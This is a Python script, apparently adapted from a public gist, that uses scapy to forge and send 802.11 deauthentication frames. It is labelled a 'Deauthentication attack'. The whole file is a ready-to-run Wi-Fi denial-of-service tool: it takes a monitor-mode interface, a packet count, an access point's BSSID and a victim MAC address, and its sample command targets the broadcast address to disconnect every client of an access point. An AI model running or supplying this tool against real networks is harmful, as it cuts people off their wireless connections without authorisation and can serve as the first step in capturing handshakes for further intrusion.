#!/usr/bin/env python3
# Inspired from https://gist.githubusercontent.com/bin3xish477/67111cd4ab9313b73a8639e959750903/raw/282076f81277685a35ff52d35ddc3821402fa530/deauthenticator.py

from scapy.all import (
  RadioTap,    # Adds additional metadata to an 802.11 frame
  Dot11,       # For creating 802.11 frame
  Dot11Deauth, # For creating deauth frame
  sendp        # for sending packets
)
from argparse import ArgumentParser as AP
from sys import exit

def deauth(iface: str, count: int, bssid: str, target_mac: str, reason_code: int):
    """
    Sends deauthentication frames to a target MAC address from a specified interface, 
    with a specified number of packets, to disconnect it from an access point with 
    a specified BSSID using a specified reason code.
    """
    # Create a Dot11 object representing the deauthentication frame
    dot11 = Dot11(addr1=target_mac, addr2=bssid, addr3=bssid)
    # Create a RadioTap object to add additional metadata to the frame
    frame = RadioTap()/dot11/Dot11Deauth(reason=reason_code)
    # Send the frame on the specified interface, with the specified number of packets, 
    # and an inter-packet delay of 0.1 seconds
    sendp(frame, iface=iface, count=count, inter=0.100)

if __name__ == "__main__":
    # Create an argument parser
    parser = AP(description="Perform Deauthentication attack against a computer")
    # Add arguments for the interface, number of packets, BSSID, and target MAC address
    parser.add_argument("-i", "--interface",help="interface to send deauth packets from")
    parser.add_argument("-c", "--count",help="The number of deauthentication packets to send to the victim computer")
    parser.add_argument("-a", "--bssid",metavar="MAC",help="the MAC address of the access point (Airodump-ng BSSID)")
    parser.add_argument("-t", "--target-mac",metavar="MAC",help="the MAC address of the victim's computer (Airodump-ng Station)")
    # Add an argument for the reason code, with a default value of 7
    parser.add_argument("-r", "--reason-code", type=int, default=7, help="the reason code for deauth packet")
    # Parse the arguments
    args = parser.parse_args()
    # Check that all required arguments are present
    if (not args.interface or not args.count 
        or not args.bssid or not args.target_mac):
        print("[-] Please specify all program arguments... run `sudo python3 deauthenticator.py -h` for help")
        print("Example usage: sudo python3 deauth.py -i wlan0mon -c 200 -a 7c:95:f3:00:79:d3 -t FF:FF:FF:FF:FF:FF")
        exit(1)
    # Call the deauth function with the specified arguments
    deauth(args.interface, int(args.count), args.bssid, args.target_mac, args.reason_code)
